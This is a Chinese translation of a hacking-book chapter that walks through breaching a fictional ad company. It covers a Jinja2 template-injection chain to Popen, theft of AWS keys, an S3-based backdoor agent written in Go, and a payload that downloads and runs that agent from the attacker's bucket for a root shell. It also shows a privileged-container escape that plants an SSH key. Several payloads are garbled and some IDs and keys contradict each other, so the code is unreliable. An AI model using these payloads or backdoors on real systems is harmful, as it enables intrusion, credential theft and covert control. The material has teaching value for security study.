# 第六章：Fracture

![](img/chapterart.png)

到目前为止，我们已经获得了一些 MXR Ads 的凭证，并且揭示了 MXR Ads 和 GP 处理其基础设施的主要方式，但我们不确定如何处理这些发现。我们仍然有许多机会去探索，因此我们回到原点：我们在第四章中确认的少数几个 GP 和 MXR Ads 网站（见清单 4-3）。在第五章中，我们凭直觉追踪了最具吸引力的资源——S3 桶，最终发现了一个服务器端请求伪造（SSRF）漏洞。但现在，我们将采取更稳妥、更艰苦的方法。

我们将浏览每个网站，跟踪每个链接，检查每个参数，甚至使用像 LinkFinder（[`github.com/GerbenJavado/LinkFinder/`](https://github.com/GerbenJavado/LinkFinder/)）这样的工具收集 JavaScript 文件中的隐藏链接。为此，我们将把精心挑选的特殊字符注入到表单和字段中，直到触发异常反应，比如明确的数据库错误、404（页面未找到）错误，或者意外重定向到主页。

我们将依赖 Burp 来悄悄捕获所有发送到服务器的参数。这个操作高度依赖于网站背后的网络框架、编程语言、操作系统和其他几个因素，因此，为了简化过程，我们将注入以下有效载荷，并将输出与应用程序的正常响应进行比较：

```
dddd",'|&$;:`({{@<%=ddd
```

这个字符串覆盖了不同框架中最明显的注入漏洞：（无）SQL、系统命令、模板、轻量级目录访问协议（LDAP），以及几乎所有使用特殊字符扩展查询接口的组件。`dddd`部分像一个标签，作为一些易于发现的文本，帮助我们在页面响应中直观地定位有效载荷。页面对这个字符串做出轻微异常反应（比如错误页面、奇怪的重定向、截断的输出，或者输入参数以奇怪的方式反映在页面上），都是值得进一步调查的有前景线索。如果网页返回了一个无害的响应，但似乎以某种方式转换或过滤了输入，我们可以通过更先进的有效载荷进一步探测，比如添加逻辑运算符（`AND 1=0`）、指向真实文件位置、尝试实际命令等等。

我们开始将这个有效载荷注入到我们列表中每个网站的表单中。不久，我们到达了网址 www.surveysandstats.com，这是一个臭名昭著的网站，用来收集并探查人们的个性数据，我们在第四章中揭示了这个网站。这里有许多字段可以注入我们的放荡字符串。我们将其输入到一个表单中，点击提交，接着看到令人愉快的错误页面，如图 6-1 所示。

![f06001](img/f06001.png)

图 6-1：*Surveysandstats.com* 对我们的字符串注入做出反应

啊哈！这就是让黑客兴奋不已的那种错误。我们转向 Burp，再次提交表单，这次使用完全无害的调查问题回答，且没有任何特殊字符，仅仅是简单的英文，以确保表单正常工作（见图 6-2）。表单正常工作时，应该会发送一封电子邮件确认。

![f06002](img/f06002.png)

图 6-2：Burp 中的常规表单提交

果然，几秒钟后，我们收到了带有调查结果的电子邮件（见图 6-3）。

![f06003](img/f06003.png)

图 6-3：来自我们正常调查提交的电子邮件回复

调查表运行得很好，这意味着第一次崩溃页面的确很可能是因为我们的有效载荷中某个特殊字符。为了确认是哪个字符，我们重新提交之前的正常表单条目，每次添加一个特殊字符，直到我们确定嫌疑字符：`{{`（双大括号）。我们很可能正在处理服务器端模板注入（SSTI），因为模板通常依赖于双大括号。

## 服务器端模板注入

在许多 Web 开发框架中，模板是简单的 HTML 文件，并带有一些特殊变量，这些变量在运行时会被动态值替换。以下是一些在各种框架中使用的特殊变量：

```
# Ruby templates
<p>
<%= @product %>
</p>
# Play templates (Scala/Java)
<p>
Congratulations on product @product
</p>
# Jinja or Django templates
<p>
Congratulations on product {{product}}
</p>
```

Web 项目的前端（HTML/JavaScript 中的可视化）和后端（Python/Ruby/Java 中的控制器或模型）之间的分离是许多开发框架乃至许多团队组织的基石。当模板本身是通过不受信任的输入动态构建时，问题就开始了。比如以下代码，它通过`render_template_string`函数生成动态模板，而该函数本身是通过用户输入构建的：

```
`--snip--`
template_str = """
    <div>
        <h1>hello</h1>
 <h3>%s</h3>
    </div>
     """ % user_input

return render_template_string(template_str)
```

在这段 Python 代码中，如果我们在`user_input`变量中注入一个有效的模板指令，如`{{8*2}}`，它将通过`render_template_string`方法计算为 16，这意味着页面将显示结果`16`。问题在于，每个模板引擎都有自己独特的语法，因此并不是所有的模板引擎都会这样进行计算。有些模板引擎允许你读取文件并执行任意代码，而其他的则甚至不允许你进行简单的乘法运算。

这就是为什么我们首先要做的事情是收集更多有关该潜在漏洞的信息。我们需要弄清楚正在使用的是什么语言以及运行的是什么框架。

### 框架指纹识别

自从 James Kettle 在 2015 年 Black Hat USA 大会上展示 SSTI 以来，他的著名图表描绘了识别模板框架的方法，几乎在每一篇关于该漏洞的文章中都能看到，包括在图 6-4 中。为了探索它是如何工作的，我们将在调查表中输入一些不同的表达式，看看它们是如何被执行的。

![f06004](img/f06004.png)

图 6-4：不同的 SSTI 载荷用于指纹识别模板框架

我们发送载荷`{{8 * '2'}}`，并收到一封电子邮件，邮件内容是字符串`2`重复八次，如图 6-5 所示。这种行为是典型的 Python 解释器行为，而不像 PHP 环境，后者会打印`16`。

```
# Payload

{{8*'2'}} # Python: 22222222, PHP: 16

{{8*2}} # Python: 16, PHP: 16
```

![f06005](img/f06005.png)

图 6-5：输入`8 * '2'`的典型 Python 输出

从中我们很快得出结论，我们可能正在处理 Python 环境中著名的 Jinja2 模板。Jinja2 通常运行在两大主流 Web 框架之一：Flask 或 Django 上。曾几何时，通过快速查看“服务器”HTTP 响应头就能知道是哪一个。不幸的是，现在没有人再将 Flask/Django 应用程序裸露在互联网上了。它们通常通过 Apache 和 Nginx 服务器，或者在这个案例中，通过覆盖原始服务器指令的 AWS 负载均衡器。

不用担心。有一个快速的载荷可以在 Flask 和 Django Jinja2 模板中都有效，而且它非常好用：`request.environ`。在这两个框架中，这个 Python 对象包含有关当前请求的信息：HTTP 方法、头信息、用户数据，最重要的是，应用加载的环境变量。

```
# Payload

email=davidshaw@pokemail.net&user={{request.environ}}...
```

图 6-6 展示了我们从这个载荷获得的响应。

![f06006](img/f06006.png)

图 6-6：来自`request.environ`的响应

Django 字面上出现在`PYENV_DIR`路径中。中奖了。这个应用程序的开发者似乎决定用更强大的 Jinja2 模板框架替代默认的 Django 模板引擎。这对我们来说是幸运的，因为虽然 Jinja2 支持 Python 表达式和操作的一个子集，使其在性能和生产力方面更具优势，但这种灵活性是有代价的：我们可以操作 Python 对象、创建列表、调用函数，甚至在某些情况下加载模块。

### 任意代码执行

几乎让人忍不住想提前跳跃，尝试通过像`{{os.open('/etc/passwd')}}`这样的载荷来访问密码文件，但那是行不通的。`os`对象很可能在当前应用程序的上下文中未定义。我们只能与在渲染响应的页面中定义的 Python 对象和方法交互。我们之前访问过的`request`对象是 Django 自动传递给模板的，因此我们可以自然地检索它。`os`模块？极不可能。

但是，*幸运的是*，大多数现代编程语言都为我们提供了某种程度的内省和反射——*反射*是指程序、对象或类能够检查自身的能力，包括列出自己的属性和方法、改变其内部状态等。这是许多高级语言（如 C#、Java、Swift）中的常见特性，而 Python 也不例外。任何 Python 对象都包含属性以及指向其自身类属性和父类属性的指针。

例如，我们可以使用`__class__`属性获取任何 Python 对象的类，它返回一个有效的 Python 对象，引用该类：

```
# Payload

email=davidshaw@pokemail.net&user=`{{request__class__ }}`...

<class 'django.core.handlers.wsgi.WSGIRequest'>
```

该类本身是一个更高层次的 Python 对象的子类，名为`django.http.request.HttpRequest`。我们甚至不需要阅读文档来发现这一点；它直接写在对象内部，在`__base__`变量里，我们可以通过这个有效载荷看到这一点：

```
# Payload

email=davidshaw@pokemail.net&user={{request.__class__.`__base__`}}...
<class 'django.http.request.HttpRequest'>

email=davidshaw@pokemail.net&user={{request.__class__.__base__.`__base__`}}...
<class 'object'> 1
```

我们继续沿着继承链向上爬升，将`__base__`添加到有效载荷中，直到到达最顶层的 Python 对象 1——所有类的父类：`object`。`object`类本身没有任何用处，但像所有其他类一样，它也包含对其子类的引用。因此，在沿着链向上爬升后，现在是时候使用`__subclasses__`方法向下爬升了：

```
# Payload

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__`.__subclasses__()`}}...

[<class 'type'>,
 <class 'dict_values'>,
 <class 'django.core.handlers.wsgi.LimitedStream'>,
 <class 'urllib.request.OpenerDirector'>,
 <class '_frozen_importlib._ModuleLock'>,
 <class 'subprocess.Popen'>,1
`--snip--`
 <class 'django.contrib.auth.models.AbstractUser.Meta'>,
]
```

超过 300 个类出现在这里。这些是所有直接从`object`类继承并由当前 Python 解释器加载的类。

我希望你已经注意到`subprocess.Popen`类 1！这是用于执行系统命令的类。我们可以立即在这里调用该对象，通过引用它在子类列表中的偏移量，在这个特定情况下它是第 282 个（通过手动计数得出的）。我们可以使用`communicate`方法捕获`env`命令的输出：

```
# Payload

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()
`282.communicate()[0]`}}...

A couple of seconds later, we receive an email spilling out the environment variables of
the Python process running on the machine:
PWD=/opt/`django`/surveysapp
PYTHON_GET_PIP_SHA256=8d412752ae26b46a39a201ec618ef9ef7656c5b2d8529cdcbe60cd70dc94f40c
KUBERNETES_SERVICE_PORT_HTTPS=443
HOME=/root
`--snip--`
```

我们刚刚实现了任意代码执行！让我们看看我们能用什么。所有 Django 设置通常都在一个名为*settings.py*的文件中声明，该文件位于应用程序的根目录。这个文件可以包含从简单的管理员电子邮件声明到秘密 API 密钥的任何内容。从环境变量中我们知道应用程序的完整路径是*/opt/Django/surveysapp*，而*settings*文件通常位于该路径下一级目录（同名）。在列表 6-1 中，我们尝试访问它。

```
# Payload

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()
282.communicate()[0]}}...

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SERVER_EMAIL = "no-replay@sureveysandstats.com"
SES_RO_ACCESSKEY = "AKIA44ZRK6WSSKDSKJPV" 1
SES_RO_SECRETKEY = "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" 2
`--snip--`
```

列表 6-1：访问*surveysandstats.com*设置文件

我们获取了 SES 12（简单邮件服务）的凭据，它是一个 AWS 托管的邮件服务，提供 SMTP 网关、POP3 服务器等。这完全是预料之中的，因为应用程序的主要活动是将电子邮件结果发送给候选人。

这些凭证可能具有非常有限的作用范围，比如发送邮件。我们可以尝试发挥创意，利用这个新获得的能力钓鱼攻击一些管理员，但现在，这些凭证将服务于一个更迫切的目标：在我们花更多时间之前，确认 *surveysandstats.com* 确实属于 MXR Ads 或至少在相同的 AWS 环境中运行。

### 确认所有者

你可能记得我们在第四章中通过在 Gist 和 Pastebin 上查找公共笔记时，发现了那个可疑的 *surveysandstats.com* 网站。根据我们目前知道的，它可能是一个与我们的真正目标无关的完全独立的组织。让我们查明真相。首先，我们将尝试获取账户 ID，这只需一次 API 调用，并且不需要任何特殊权限，因此我们可以使用刚刚找到的 SES 密钥。每个默认情况下都有访问此信息的 AWS IAM 用户。在 清单 6-2 中，我们使用了从 清单 6-1 获取的访问密钥 1 和秘密密钥 2 来获取账户 ID。

```
root@Point1:~/# vi ~/.aws/credentials
[ses]
aws_access_key_id = **AKIA44ZRK6WSSKDSKJPV**
aws_secret_access_key = **M0pQIv3FlDXnbyNFQurMZ9ynxD0gdNkRUP1r0o3Z**

root@Point1:~/# aws sts get-caller-identity --profile ses
{
  "UserId": "AIDA4XSWK3WS9K6IDDD0V",
  "Account": "886371554408",
  "Arn": "arn:aws:iam::886477354405:user/ses_ro_user"
}
```

清单 6-2：追踪 *surveysandstats.com* 账户 ID

正在按计划进行：886371554408 是我们在第五章中找到的与 MXR Ads 演示应用程序相关的相同 AWS 账户 ID。我们成功了！

## 偷运桶

现在，我们唯一想做的就是植入一个反向 Shell，然后安静地喝着咖啡，同时让一些后期利用插件筛查几 GB 的数据，寻找密码、秘密和其他宝贵的东西。但生活并不总是如此顺利。

当我们尝试从我们在第三章创建的自定义域加载任何文件时，请求始终无法到达目标：

```
# Payload

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()
282.communicate()[0]}}...

`<empty>`
```

某种过滤器似乎阻止了 HTTP 请求向外界发送。也没关系。我们将尝试反向操作，查询元数据 API 169.254.169.254。这个默认的 AWS 端点帮助我们在第五章的示例应用程序中获取了很多信息。希望它能为我们提供更多的凭证供我们操作……或者不会：

```
# Payload

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()
282.communicate()[0]}}...

`<empty>`
```

不幸的是，每次我们利用这个 SSTI 漏洞时，都会触发带有命令输出的邮件。可不是一个隐秘的攻击向量。MXR Ads 还真是做得不错，锁住了它的外发流量。虽然这是一个常见的安全建议，但很少有公司敢于在其机器上系统性地实施流量过滤，主要是因为这需要大量的设置来处理一些合法的边缘案例，比如检查更新和下载新包。我们在第五章中遇到的 mxrads-dl 桶现在完全有意义：它必须充当一个本地仓库，镜像所有服务器需要的公共包。这样的环境不容易维护，但在像这样的情况下却是值得的。

不过有一个问题：MXR Ads 是如何明确允许流量访问 mxrads-dl 存储桶的呢？安全组（AWS 防火墙规则）是第 4 层组件，只能识别 IP 地址，而 S3 存储桶的 IP 地址可能会发生变化，这取决于许多因素。那么，*surveysandstats.com*网站是如何仍然能够访问 mxrads-dl 存储桶，却无法向互联网的其他部分发送数据包的呢？

一种可能的解决方案是将 S3 在给定区域的所有 IP 范围列入白名单，例如 52.218.0.0/17、54.231.128.0/19 等。然而，这种方法不仅丑陋，而且非常不稳定，勉强能完成任务。

一个更具可扩展性且适应云环境的方法是创建一个 S3 VPC 端点（详见[`docs.aws.amazon.com/glue/latest/dg/vpc-endpoints-s3.html`](https://docs.aws.amazon.com/glue/latest/dg/vpc-endpoints-s3.html)）。这比听起来简单：*虚拟私有云*（VPC）是一个与外界隔离的私有网络，企业在其中运行自己的机器。它可以被划分为多个子网，就像任何普通的路由器接口一样。AWS 可以将一个特殊的端点 URL 插入到这个 VPC 中，该 URL 会将流量路由到其核心服务，比如 S3。机器不会通过互联网访问 S3，而是会联系这个特殊的 URL，流量通过亚马逊的内部网络被传递到 S3。这样，与其在外部 IP 地址上设置白名单，不如简单地将 VPC 的内部地址范围（10.0.0.0/8）加入白名单，从而避免任何安全问题。

但问题的关键在于细节，因为 VPC 端点仅关注机器试图访问的 AWS 服务。它并不关心存储桶或文件。存储桶甚至可能属于另一个 AWS 账户，但流量仍然会通过 VPC 端点流向目标！因此，从技术上讲，即使 MXR Ads 似乎封锁了调查应用程序与互联网的连接，我们仍然可以偷偷地向自己 AWS 账户中的存储桶发出请求，并让该应用程序运行我们控制的文件。让我们来测试这个理论。

我们将上传一个名为*beaconTest.html*的虚拟 HTML 文件到我们的某个存储桶，并通过授予`GetObject`权限给所有人，使其公开。

我们首先创建一个名为 mxrads-archives-packets-linux 的存储桶：

```
root@Point1:~/# aws s3api create-bucket \
**--bucket mxrads-archives-packets-linux \**
**--region=eu-west-1 \**
**--create-bucket-configuration \**
**LocationConstraint=eu-west-1**
```

接着，我们将一个虚拟文件上传到我们的存储桶并命名为*beaconTest.html*：

```
root@Point1:~/# aws s3api put-object \
**--bucket mxrads-archives-packets-linux \**
**--key beaconTest.html \**
**--body beaconTest.html**
```

然后，我们将该文件设为公开：

```
root@Point1:~/# aws s3api put-bucket-policy \
**--bucket mxrads-archives-packets-linux \**
**--policy file://<(cat <<EOF**
**{**
 **"Id": "Policy1572645198872",**
 **"Version": "2012-10-17",**
 **"Statement": [**
 **{**
 **"Sid": "Stmt1572645197096",**
 **"Action": [**
 **"s3:GetObject", "s3:PutObject"**
 **],**
 **"Effect": "Allow",**
 **"Resource": "arn:aws:s3:::mxrads-archives-packets-linux/*",**
 **"Principal": "*"**
 **}**
 **]**
**}**
**EOF)**
```

最后，我们开始通过*surveysandstats.com*网站获取*beaconTest.html*文件。如果一切按预期工作，我们应该会收到虚拟 HTML 内容的响应：

```
# Payload to the surveysandstats site form

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()
282.communicate()[0]}}...

# Results in email
<html>hello from beaconTest.html</html>
```

这虽然是个长远的尝试，但确实值得！我们找到了一个可靠的方式，可以从这个完全封闭的调查应用程序与外界进行通信。通过使用 S3 文件，我们现在可以设计一个准互动协议，在这个隔离的机器上执行代码。

## 使用 S3 的质量后门

我们将开发一个代理-操作员系统，以便轻松执行代码并在`surveysandstatsmachine`上获取输出。我们服务器上的第一个程序，被称为*操作员*，将命令写入一个名为*hello_req.txt*的文件。运行在调查网站上的第二个程序——*代理*——每隔几秒钟会获取一次*hello_req.txt*文件，执行其内容，并将结果上传到 S3 上的*hello_resp.txt*文件。我们的操作员将定期检查这个文件并打印其内容。这个交换过程在图 6-7 中有所展示。

![f06007](img/f06007.png)

图 6-7：通过 S3 文件执行命令

操作员将拥有对`mxrads-archives-packets-linux`桶的完全访问权限，因为它将在我们自己信任的服务器上运行，并且具有所需的 AWS 凭证。代理只需要对*hello_resp.txt*文件具有`PutObject`权限，并对*hello_req.txt*文件具有`GetObject`权限。这样，即使分析师靠得太近，他们也只能看到最后发送的命令，而无法看到实际的响应。

我已经在 GitHub 上提供了操作员和代理的基本实现，地址是[`github.com/HackLikeAPornstar/GreschPolitico/tree/master/S3Backdoor/`](https://github.com/HackLikeAPornstar/GreschPolitico/tree/master/S3Backdoor/)，如果你想进行实验、调整或为其添加更多功能，可以随意操作。接下来的章节中我们将回顾一些代码的亮点。

### 创建代理

正如你可能从仓库中一瞥中注意到的，我决定用 Golang 编写代理，因为它运行速度快，生成的是静态链接的可执行文件，并且比 C/C++更高效、友好。`main`函数设置所需的变量，如文件名和 HTTP 连接器，然后进入主循环，如清单 6-3 所示。

```
func main() {
  reqURL := fmt.Sprintf("https://%s.s3.amazonaws.com/%s_req.txt", *bucket, *key)
  respURL := fmt.Sprintf("https://%s.s3.amazonaws.com/%s_resp.txt", *bucket, *key)

  client := &http.Client{}
```

清单 6-3：设置代理变量

我们与 S3 的交互将通过 HTTP REST 查询（GET 用于获取内容，PUT 用于上传数据）进行，以避免与机器角色产生任何奇怪的权限重叠。有关适当的 S3 策略，请参见本书的资源：[`nostarch.com/how-hack-ghost/`](https://nostarch.com/how-hack-ghost/)。

在清单 6-4 中，我们通过每两秒执行一次`fetchData`方法，设置代理从`reqURL`下载要执行的数据。

```
 for {
   time.Sleep(2 * time.Second)
   cmd, etag, err = fetchData(client, reqURL, etag)
`--snip--`
   go func() {
       output := execCmd(cmd)
       if len(output) > 0 {
          uploadData(client, respURL, output)
       }
   }()
 }
```

清单 6-4：下载数据

如果自上次访问以来文件已被修改（HTTP 状态码 200 表示已修改），那么新的命令将通过`execCmd`方法可供执行。否则，我们会收到 HTTP 304（未修改）响应，并在几秒钟后悄悄重试。

结果随后将通过`uploadData`方法返回到桶中。下一个部分（见清单 6-5）创建了`uploadData`方法。

```
func uploadData(client *http.Client, url string, data []byte) error {

 req, err := http.NewRequest("PUT", url, bytes.NewReader(data))
 req.Header.Add("x-amz-acl", "bucket-owner-full-control")
 _, err = client.Do(req)
 return err
}
```

清单 6-5：代理的`uploadData`方法

`uploadData`方法是一个经典的 HTTP PUT 请求，但这里有一个小的额外细节：`x-amz-acl`头部。这个头部指示 AWS 将上传文件的所有权转移到目标桶的所有者，即我们。如果没有这个头部，文件将保持原来的所有权，我们将无法使用 S3 API 来检索它。如果你对`execCmd`、`fetchData`和`uploadData`函数的实现感兴趣，别犹豫，去看看书本 GitHub 仓库里的代码。

编写此类代理程序的第一个关键要求是稳定性。我们将其投放到敌方阵地，因此需要妥善处理所有错误和边缘情况。错误的异常可能导致代理崩溃，从而失去我们的远程访问权限。谁知道模板注入漏洞第二天还会不会存在呢？

Golang 通过从一开始就不引入异常来处理异常。大多数调用返回一个错误代码，在继续之前应该检查该错误代码。只要我们严格遵循这一做法，并且遵守其他一些良好的编码习惯，比如在解引用之前检查空指针，我们应该相对安全。其次是并发性。我们不希望因为程序在执行一个`find`命令而导致代理的资源消耗 20 分钟，进而使程序崩溃。这就是为什么我们将`execCmd`和`uploadData`方法封装在一个 goroutine 中（前缀`go func()...`）。

将 goroutine 看作是与其余代码并行执行的一组指令。所有的 goroutine 共享与主程序相同的线程，从而节省了一些数据结构和通常由内核在从一个线程切换到另一个线程时所做的昂贵的上下文切换。为了给你一个实际的对比，goroutine 分配大约 4KB 的内存，而操作系统线程大约需要 1MB。你可以在一台普通计算机上轻松运行数十万个 goroutine 而不会出现问题。

我们将源代码编译成一个名为*runcdd*的可执行文件，并将其上传到我们的 S3 桶中，它将静静地待在那里，随时待命：

```
root@Point1:~/# git clone **https://github.com/HackLikeAPornstar/GreschPolitico**
root@Point1:~/# cd S3Backdoor/S3Agent
root@Point1:~/# go build -ldflags="-s -w" -o ./runcdd main.go
root@Point1:~/# aws s3api put-object \
**--bucket mxrads-archives-packets-linux \**
**--key runcdd \**
**--body runcdd**
```

Go 的一些令人烦恼的地方之一是，它会将最终的二进制文件膨胀，包含符号、文件路径以及其他敏感数据。我们使用`-s`标志去除一些符号，使用`-w`去除调试信息，但要知道，分析人员仍然可以挖掘出关于用于生成此可执行文件的环境的很多信息。

### 创建操作符

操作符部分遵循非常相似但相反的逻辑：它推送命令并获取结果，同时模仿交互式 Shell。你将会在相同的仓库中找到这次使用 Python 编写的代码：

```
root@Point1:~/S3Op/# python main.py
Starting a loop fetching results from S3 mxrads-archives-packets-linux
Queue in commands to be executed
shell>
```

我们访问我们的易受攻击的表单*surveysandstats.com*，并提交以下有效载荷来下载并运行代理：

```
# Payload to the surveysandstats site form

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()
282.communicate()[0]}}...
```

解码后的有效载荷是多行的：

```
wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/runcdd
chmod +x runcdd
./runcdd &
```

然后我们在机器上运行操作符：

```
root@Point1:~S3Fetcher/# python main.py
Starting a loop fetching results from S3 mxrads-archives-packets-linux

New target called home d5d380c41fa4
shell> **id**
Will execute id when victim checks in

1 uid=0(root) gid=0(root) groups=0(root)
```

这花了一些时间，但我们终于在 MXR Ads 的受信环境内拥有了一个可用的 Shell 1。让乐趣开始吧。

## 尝试突破

我们最终进入了 MXR Ads 的一个受欢迎的 VPC 内的服务器，并获得了 root 访问权限……还是说我们真的有呢？现在还有人敢以 root 身份运行生产应用程序吗？很可能，我们实际上只是进入了一个容器，而这个命名空间中的“root”用户被映射到了主机上的某个随机非特权用户 ID。

验证我们假设的一个快捷方法是仔细查看 PID 编号为 1 的进程：检查其命令行属性、cgroups 和挂载的文件夹。我们可以在*/proc*文件夹中查看这些不同的属性——这是一个虚拟文件系统，存储着关于进程、文件句柄、内核选项等的信息（参见列表 6-6）。

```
shell> **id**
uid=0(root) gid=0(root) groups=0(root)

shell> **cat /proc/1/cmdline**
/bin/sh

shell> **cat /proc/1/cgroup**
11:freezer:/docker/5ea7b36b9d71d3ad8bfe4c58c65bbb7b541
10:blkio:/docker/5ea7b36b9d71d3ad8bfe4c58c65bbb7b541dc
9:cpuset:/docker/5ea7b36b9d71d3ad8bfe4c58c65bbb7b541dc
`--snip--`

shell> **cat /proc/1/mounts**
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/6CWK4O7ZJREMTOZGIKSF5XG6HS
```

列表 6-6：列出*/proc*文件夹中 PID 为 1 的进程的属性

我们可以继续，但从 cgroup 名称和挂载点中提到 Docker 来看，我们显然已经被困在一个容器里。此外，在典型的现代 Linux 系统中，启动第一个进程的命令应该类似于*/sbin/init*或*/usr/lib/systemd*，而不是*/bin/sh*。

即使在容器内是 root 用户，仍然可以安装软件包并访问 root 保护的文件，但我们只能对属于我们狭窄且非常有限命名空间的资源行使这种权力。

进入容器后，第一个反应就是检查是否在特权模式下运行。

## 检查特权模式

在*特权执行模式*下，Docker 仅充当一个打包环境：它保持命名空间隔离，但允许广泛访问所有设备文件，如硬盘，以及所有 Linux 功能（更多内容请见下一节）。

因此，容器可以更改主机系统上的任何资源，如内核特性、硬盘、网络等。如果我们发现自己处于特权模式下，我们可以直接挂载主分区，在任意主目录中插入一个 SSH 密钥，并在主机上打开一个新的管理员 Shell。以下是在实验室中为说明目的展示的概念验证：

```
# Demo lab
root@DemoContainer:/# ls /dev
autofs           kmsg                ppp       tty10
bsg              lightnvm            psaux     tty11
`--snip--`
# tty devices are usually filtered out by cgroups, so we must be inside a privileged container

root@DemoContainer:/# fdisk -l
Disk /dev/dm-0: 23.3 GiB, 25044189184 bytes, 48914432 sectors
Units: sectors of 1 * 512 = 512 bytes
`--snip--`

# mount the host's main partition
root@DemoContainer:/# mount /dev/dm-0 /mnt && ls /mnt
bin   dev  home lib  lost+found  mnt  proc...

# inject our SSH key into the root home folder
root@DemoContainer:/# echo "ssh-rsa AAAAB3NzaC1yc2EA..." > /mnt/root/.ssh/authorized_keys

# get the host's IP and SSH into it
root@DemoContainer:/# ssh root@172.17.0.1

root@host:/#
```

你可能会认为没有人敢在特权模式下运行容器，特别是在生产环境中，但生活总是充满惊喜，有些人可能确实需要这样做。例如，某个开发者可能需要调整一个像 TCP 超时值这样的简单设置（一个内核选项）。为此，开发者自然会浏览 Docker 文档，并找到`sysctl` Docker 标志，它实际上是在容器内运行`sysctl`命令。然而，当执行该命令时，除非以特权模式调用，否则该命令当然无法更改内核的 TCP 超时选项。让容器进入特权模式是一个安全风险这一事实，甚至不会引起这个开发者的注意——`sysctl`可是 Docker 文档中正式支持的标志，天哪！

## Linux 功能

现在我们可以回到我们的调查应用程序，检查我们是否能轻松突破命名空间隔离。我们列出了 */dev* 文件夹的内容，但结果缺少了所有经典的伪设备文件，如 *tty*、*sda* 和 *mem*，这些文件通常暗示着特权模式。一些管理员用一系列个体权限或能力来替代特权模式。可以把 *能力* 看作是对传统上归属于 Linux 上万能 root 用户的权限的精细化分解。拥有 `CAP_NET_ADMIN` 能力的用户可以在网络堆栈上执行 root 操作，例如更改 IP 地址、绑定低端端口以及进入混杂模式嗅探流量。然而，该用户将无法挂载文件系统，例如。那项操作需要 `CAP_SYS_ADMIN` 能力。

当容器所有者通过 `--add-cap` 标志指示时，Docker 可以向容器附加额外的能力。这些强大的能力中的一些可以用来突破命名空间隔离，访问其他容器，甚至通过嗅探路由到其他容器的包、加载在主机上执行代码的内核模块或挂载其他容器的文件系统来危及主机。

我们通过检查 */proc* 文件系统来列出当前 surveysapp 容器的能力，然后使用 `capsh` 工具将其解码为有意义的权限：

```
shell> **cat /proc/self/status |grep Cap**
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

root@Bouncer:/# capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid
,cap_kill,cap_setgid,cap_setuid,cap_setpcap,...
```

我们当前用户的有效和允许的能力是 `CapPrm` 和 `CapEff`，这相当于我们在容器内可以从 root 用户那里期望得到的正常权限集合：终止进程（`CAP_KILL`）、更改文件所有者（`CAP_CHOWN`）等等。所有这些操作都严格限制在当前命名空间内，因此我们仍然被困在这里。

## Docker 套接字

接下来，我们查找 */var/run/docker.sock* 文件，这是与主机上的 Docker 守护进程通信的 REST API。如果我们能从容器内访问这个套接字，例如通过简单的 `curl` 命令，我们可以指示它启动一个特权容器，然后获得对主机系统的 root 访问权限。我们首先检查 *docker.sock*：

```
shell> **curl --unix-socket /var/run/docker.sock http://localhost/images/json**
curl: (7) Couldn't connect to server

shell> **ls /var/run/docker.sock**
ls: cannot access '/var/run/docker.sock': No such file or directory
shell> **mount | grep docker**

# docker.sock not found
```

这没有运气。我们随后检查了内核的版本，希望能找到一个带有文档漏洞的版本来攻破主机，但我们再次失败。该机器运行的是 4.14.146 内核，在我运行这个时，这个版本仅比最新版本落后几版：

```
shell> **uname -a**
Linux f1a7a6f60915 4.14.146-119.123.amzn2.x86_64 #1
```

总的来说，我们在一台没有明显配置错误或漏洞的最新机器上以一个相对无能的 root 用户身份运行。我们始终可以在实验室里设置一个类似的内核，然后深入研究内存结构和 `syscalls`，直到找到一个零日漏洞来突破命名空间隔离，但我们把这当作最后的手段来使用。

任何理智的人被困在笼子里时，第一反应就是试图挣脱。这是一个高尚的情感。但是，如果我们可以在被禁锢的情况下实现我们最阴险的目标，那为什么一开始要浪费时间去锯开笼子呢？

降落到主机上并检查其他容器当然很好，但考虑到当前的环境，我认为是时候从这扇被锁住的窗户后退一步，放下那把无用的钝锤，转而关注更大的局面了。

忘了从这个单一、无关紧要的主机上突破吧。如何一举摧毁整个楼层——不，整个大楼呢？那才是值得一说的故事。

还记得我们在第 92 页的“任意代码执行”中如何转储环境变量吗？我们确认了模板注入漏洞，并重点关注了与 Django 相关的变量，因为那是当前任务的核心，但如果你仔细观察，或许会发现更为重要的线索。一些更宏大的东西。

让我再展示一次输出结果：

```
shell> **env**

PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOME=/root
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443
`--snip--`
```

我们正在一个由 Kubernetes 集群管理的容器内运行！别管这个孤独的、人员过多的工作机器；我们有机会摧毁整个王国！

## 资源

+   Burp 以其主动扫描器而闻名，它可以自动化大部分参数侦察阶段。你也可以尝试一些扩展来对各种漏洞进行模糊测试。Snoopy Security 维护了一个有趣的扩展合集，地址是[`github.com/snoopysecurity/awesome-burp-extensions/`](https://github.com/snoopysecurity/awesome-burp-extensions/)*。

+   查看 James Kettle 的演讲《Server-Side Template Injection: RCE for the Modern Webapp》，了解各种利用技术：[`www.youtube.com/watch?v=3cT0uE7Y87s`](https://www.youtube.com/watch?v=3cT0uE7Y87s)。

+   Docker 的参考资料可以在 *[`dockr.ly/2sgaVhj`](https://dockr.ly/2sgaVhj).* 找到。

